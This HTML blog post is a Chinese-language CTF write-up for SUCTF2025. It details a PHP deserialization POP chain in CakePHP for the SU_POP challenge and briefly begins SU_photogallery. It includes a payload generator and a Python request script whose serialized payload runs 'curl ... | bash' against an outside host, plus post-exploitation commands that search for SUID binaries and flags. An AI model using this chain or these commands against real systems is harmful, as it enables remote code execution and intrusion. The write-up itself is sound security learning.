@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
+    <meta name="description" content="java题目等年后再来嘻嘻  SU_POPSU_POP 环境配置 不用使用compose Dockerfile build一下: docker build -t su_pop:latest . run一下即可: docker run -d -p 5000:80 --name su_pop su_pop:latest 可以访问就ok了  SU_POP 分析 | SV 这里链子的寻找和java的反序">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF2025">
+<meta property="og:url" content="https://kc1zs4.github.io/2025/01/21/SUCTF2025/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="java题目等年后再来嘻嘻  SU_POPSU_POP 环境配置 不用使用compose Dockerfile build一下: docker build -t su_pop:latest . run一下即可: docker run -d -p 5000:80 --name su_pop su_pop:latest 可以访问就ok了  SU_POP 分析 | SV 这里链子的寻找和java的反序">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-01-21T12:04:14.215Z">
+<meta property="article:modified_time" content="2025-01-24T13:39:57.134Z">
+<meta property="article:tag" content="recurrence">
+<meta name="twitter:card" content="summary">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
+      
+    <!-- title -->
+    <title>SUCTF2025</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
+
+ <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+     
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/24/%E5%9B%BD%E5%9F%8E%E6%9D%AF24/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/20/25%E6%98%A5%E7%A7%8B%E5%86%AC%E5%AD%A3%E8%81%94%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2025/01/21/SUCTF2025/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&text=SUCTF2025"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&is_video=false&description=SUCTF2025"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SUCTF2025&body=Check out this article: https://kc1zs4.github.io/2025/01/21/SUCTF2025/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&title=SUCTF2025"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&name=SUCTF2025&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2025/01/21/SUCTF2025/&t=SUCTF2025"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-POP"><span class="toc-number">1.</span> <span class="toc-text">SU_POP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">SU_POP 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E5%88%86%E6%9E%90-SV"><span class="toc-number">1.2.</span> <span class="toc-text">SU_POP 分析 | SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">1.3.</span> <span class="toc-text">SU_POP 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-photogallery"><span class="toc-number">2.</span> <span class="toc-text">SU_photogallery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">SU_photogallery 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E5%88%86%E6%9E%90-SV"><span class="toc-number">2.2.</span> <span class="toc-text">SU_photogallery 分析 | SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">2.3.</span> <span class="toc-text">SU_photogallery 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SU-blog"><span class="toc-number">3.</span> <span class="toc-text">SU_blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">SU_blog 环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E5%88%86%E6%9E%90-SV"><span class="toc-number">3.2.</span> <span class="toc-text">SU_blog 分析| SV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog-%E5%A4%8D%E7%8E%B0-SV"><span class="toc-number">3.3.</span> <span class="toc-text">SU_blog 复现 | SV</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">4.</span> <span class="toc-text">Summary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">SU_blog总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery%E6%80%BB%E7%BB%93"><span class="toc-number">4.2.</span> <span class="toc-text">SU_photogallery总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-POP%E6%80%BB%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">SU_POP总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        SUCTF2025
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-21T12:04:14.215Z" class="dt-published" itemprop="datePublished">2025-01-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/recurrence/" rel="tag">recurrence</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>java题目等年后再来嘻嘻</p>
+</blockquote>
+<h2 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h2><h3 id="SU-POP-环境配置"><a href="#SU-POP-环境配置" class="headerlink" title="SU_POP 环境配置"></a>SU_POP 环境配置</h3><ol>
+<li>不用使用compose</li>
+<li>Dockerfile build一下: <code>docker build -t su_pop:latest .</code></li>
+<li>run一下即可: <code>docker run -d -p 5000:80 --name su_pop su_pop:latest</code></li>
+<li>可以访问就ok了</li>
+</ol>
+<h3 id="SU-POP-分析-SV"><a href="#SU-POP-分析-SV" class="headerlink" title="SU_POP 分析 | SV"></a>SU_POP 分析 | SV</h3><ol>
+<li>这里链子的寻找和java的反序列化链子很像</li>
+<li>有源码文件，审计一波吧<ol>
+<li>&#x2F;var&#x2F;www&#x2F;html 可读可写；有mysql连接</li>
+<li>信息都会交给pagesController进行处理</li>
+<li>锁定范围pop链子，比赛时到这里找不到链子的入口点就断了，节省时间直接看题解提示和思路找链子吧(<strong>实际上并没有进行锁定，直接找bro</strong>)</li>
+</ol>
+</li>
+</ol>
+<h3 id="SU-POP-复现-SV"><a href="#SU-POP-复现-SV" class="headerlink" title="SU_POP 复现 | SV"></a>SU_POP 复现 | SV</h3><ol>
+<li><p>由于没有做出来，直接看怎么复现，分析一下目录结构</p>
+<ol>
+<li>app_local.php: 有security的salt值，数据库名与密码，EmailTransport</li>
+<li>route.php: 路由</li>
+<li>PagesController.php<ol start="4">
+<li>在handleSer()函数中传入函数即可成功反序列化，并且会显示回来(html转移了似乎<code>h()</code>)</li>
+<li>display应该可以不用管，这里就是单纯返回渲染后的文件</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>调用链子(<strong>实际上是一个很耗费时间的过程，但是大致就那么几步，简单-&gt;复杂找就好</strong>)</p>
+<ol>
+<li><strong>S1: 找文章熟悉一下和寻找及技巧(这一步也可以在后面)</strong>: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9995?time__1311=n4+xnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-8">其实这篇有看到过55</a></li>
+<li><strong>S2: 找sink</strong>: 就是代码执行或者命令执行，或者是回调(任意函数调用)的地方<ol>
+<li>这里不浪费时间，直接搜eval，最简单的有两个<ol>
+<li>Mockclass::generate() mockName, classCode均可控</li>
+<li>Mocktrait::generate() mockName, classCode均可控</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><strong>S3: 找调用处</strong>，可以是回调&#x2F;名称调用，直接搜call(，有<ol>
+<li>TraceableCommand::__call(…)</li>
+<li>ReflectionContainer::call(…)</li>
+<li>BehaviorRegistry::call(…) 这个比较easy的逻辑，设置变量比较easy</li>
+<li>Association.php::__call(…)</li>
+<li>TranslateBehavior.php::__call(…)</li>
+<li>Table.php::__call(…)</li>
+<li>后面还有很多，先复现吧</li>
+</ol>
+</li>
+<li>再找调用usages看看，也可以是__call<ol>
+<li>Table.php::__call(…) 可以调用BehaviorRegistry::call()</li>
+</ol>
+</li>
+<li><strong>S4: 魔术方法再往上比较难，按照技巧&#x2F;换一个方向寻找(或者找文章)</strong><ol>
+<li>目的是要到__call，不知道调用的是什么方法，但是可以知道是Table这个对象的(找了半个小时突然发现<strong>php是动态类型的</strong>，笑)，这里只需要是Table对象调用不同方法，这个Table对象可以是随便赋值的(因为是php)</li>
+<li>有一个方法是从给定的魔术方法入手，__toString()就很好，但是这里不是，这里是<strong>换了个方向</strong></li>
+</ol>
+</li>
+<li><strong>S5: 找__destruct()&#x2F;__wakeup()</strong><ol>
+<li>__wakeup()没有找到</li>
+<li>RejectedPromise的__destruct()下一步有__toString()，可控，ok了家人们，找__toString()到可控对象调用函数</li>
+</ol>
+</li>
+<li><strong>S6: 顺着可控的__destruct()</strong><ol>
+<li>Response.php:__toString()可控，只需要把stream变成Table即可</li>
+</ol>
+</li>
+</ol>
+<blockquote>
+<p>还是vscode用的爽</p>
+</blockquote>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">React\Promise\Internal\RejectedPromise</span>::<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">--&gt;<span class="title class_">Cake\Http\Response</span>::<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">--&gt;Cake\ORM<span class="title class_">\Table</span>::<span class="title function_ invoke__">__call</span>()</span><br><span class="line">--&gt;Cake\ORM<span class="title class_">\BehaviorRegistry</span>::<span class="title function_ invoke__">call</span>()</span><br><span class="line">--&gt;<span class="title class_">PHPUnit\Framework\MockObject\Generator\MockClass</span>::<span class="title function_ invoke__">generate</span>()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>来个payload即可</p>
+<ol>
+<li><p>本地docker起一个cakephp服务</p>
+<ol>
+<li><p>Dockerfile和docker-compose.yml如下（ai的嘻嘻）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dockerfile</span></span><br><span class="line">FROM php:<span class="number">8.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装必要的 PHP 扩展</span></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install -y \</span><br><span class="line">    libicu-dev libonig-dev libzip-dev unzip git \</span><br><span class="line">    &amp;&amp; docker-php-ext-install intl mbstring pdo pdo_mysql opcache \</span><br><span class="line">    &amp;&amp; a2enmod rewrite</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Composer</span></span><br><span class="line">RUN curl -L https:<span class="comment">//getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line">WORKDIR /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 CakePHP 5 项目</span></span><br><span class="line">RUN composer create-project --prefer-dist <span class="string">&quot;cakephp/app:^5.0&quot;</span> . \</span><br><span class="line">    &amp;&amp; chown -R www-data:www-data /<span class="keyword">var</span>/www/html \</span><br><span class="line">    &amp;&amp; chmod -R <span class="number">755</span> /<span class="keyword">var</span>/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露 Web 服务端口</span></span><br><span class="line">EXPOSE <span class="number">80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// docker-compose.yml</span></span><br><span class="line"><span class="comment">// 需要创建一个/logsl来存放logs，也可以添加更多来进行持久化</span></span><br><span class="line">services:</span><br><span class="line">    web:</span><br><span class="line">        build: .</span><br><span class="line">        ports:</span><br><span class="line">            - <span class="string">&quot;4999:80&quot;</span></span><br><span class="line">        volumes:</span><br><span class="line">            - /home/kc1zs4/Docker/SUctf25/cakephp5/logs:/<span class="keyword">var</span>/log/apache2</span><br><span class="line">        restart: always</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;webroot 下直接起一个服务可以直接使用php文件</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// su_pop.php</span></span><br><span class="line"><span class="comment">// 只需要设置需要利用到的属性即可，这里需要搞懂一下命名空间</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">PHPUnit</span>\<span class="title class_">Framework</span>\<span class="title class_">MockObject</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$classCode</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mockName</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;classCode =<span class="string">&quot;system(&#x27;curl http://xxx/ | bash&#x27;);&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mockName = <span class="string">&quot;KC1zs4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Generator</span>\<span class="title">MockClass</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BehaviorRegistry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_methodMap</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_loaded</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_methodMap = [<span class="string">&quot;rewind&quot;</span> =&gt; [<span class="string">&quot;KC1zs4&quot;</span>, <span class="string">&quot;generate&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_loaded = [<span class="string">&quot;KC1zs4&quot;</span> =&gt; <span class="keyword">new</span> <span class="title class_">MockClass</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_behaviors</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">BehaviorRegistry</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Table</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stream</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">React</span>\<span class="title class_">Promise</span>\<span class="title class_">Internal</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RejectedPromise</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$reason</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;reason = <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">RejectedPromise</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;hello kc1zs4&lt;/h1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>python payload脚本</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host=<span class="string">&quot;http://localhost:10021&quot;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">### /ser</span></span><br><span class="line">path_ser = <span class="string">&quot;/ser&quot;</span></span><br><span class="line">ser_params = &#123;</span><br><span class="line">    <span class="string">&quot;ser&quot;</span>: <span class="string">&quot;TzozODoiUmVhY3RcUHJvbWlzZVxJbnRlcm5hbFxSZWplY3RlZFByb21pc2UiOjE6e3M6NjoicmVhc29uIjtPOjE4OiJDYWtlXEh0dHBcUmVzcG9uc2UiOjE6e3M6Njoic3RyZWFtIjtPOjE0OiJDYWtlXE9STVxUYWJsZSI6MTp7czoxMDoiX2JlaGF2aW9ycyI7TzoyNToiQ2FrZVxPUk1cQmVoYXZpb3JSZWdpc3RyeSI6Mjp7czoxMDoiX21ldGhvZE1hcCI7YToxOntzOjY6InJld2luZCI7YToyOntpOjA7czo2OiJLQzF6czQiO2k6MTtzOjg6ImdlbmVyYXRlIjt9fXM6NzoiX2xvYWRlZCI7YToxOntzOjY6IktDMXpzNCI7Tzo0ODoiUEhQVW5pdFxGcmFtZXdvcmtcTW9ja09iamVjdFxHZW5lcmF0b3JcTW9ja0NsYXNzIjoyOntzOjk6ImNsYXNzQ29kZSI7czo0OToic3lzdGVtKCdjdXJsIGh0dHA6Ly84LjEzOC4xOTEuMTM6MTAwMDEvIHwgYmFzaCcpOyI7czo4OiJtb2NrTmFtZSI7czo2OiJLQzF6czQiO319fX19fQ==&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.get(host + path_ser, params=ser_params, timeout=<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入shell</p>
+<ol>
+<li>找一下flag，<code>find / -name *flag*</code></li>
+<li>find suid提权一波带走: <code>ls -al</code>，<code>find / -user root -perm -4000</code>，<code>find . -exec cat /*flag* \;</code></li>
+<li>SUCTF{PoP_CHaiN5_@Re_SO_fUn!!!}</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h2><h3 id="SU-photogallery-环境配置"><a href="#SU-photogallery-环境配置" class="headerlink" title="SU_photogallery 环境配置"></a>SU_photogallery 环境配置</h3><ol>
+<li>老样子<code>docker-compose build</code></li>
+<li>修改一下想要的端口(在docker-compose里)，然后<code>docker-compose up -d</code></li>
+</ol>
+<h3 id="SU-photogallery-分析-SV"><a href="#SU-photogallery-分析-SV" class="headerlink" title="SU_photogallery 分析 | SV"></a>SU_photogallery 分析 | SV</h3><ol>
+<li>上传需要是zip和图片，会不会有unzip</li>
+<li>可以知道是php写的，上传一下也没有好信息，报错也杯ban掉了，至少需要unzip文件怎么样啊bro</li>
+<li>这里应该是要尝试读一下文件<ol>
+<li>测信道？有些函数有啊，但是这里没有输入纯靠路由吗？zip或许先移动到&#x2F;tmp&#x2F;下？然后再解压？，直接再zip这里测信道吗 Nop!</li>
+</ol>
+</li>
+</ol>
+<h3 id="SU-photogallery-复现-SV"><a href="#SU-photogallery-复现-SV" class="headerlink" title="SU_photogallery 复现 | SV"></a>SU_photogallery 复现 | SV</h3><blockquote>
+<p>初见杀了55</p>
+</blockquote>
+<ol>
+<li><p>提取信息：测试+php，使用的是php Server(这里真是nb，写的是容易配的环境，很明显是题眼)，目的至少要读到文件，需要找相关的漏洞</p>
+<ol>
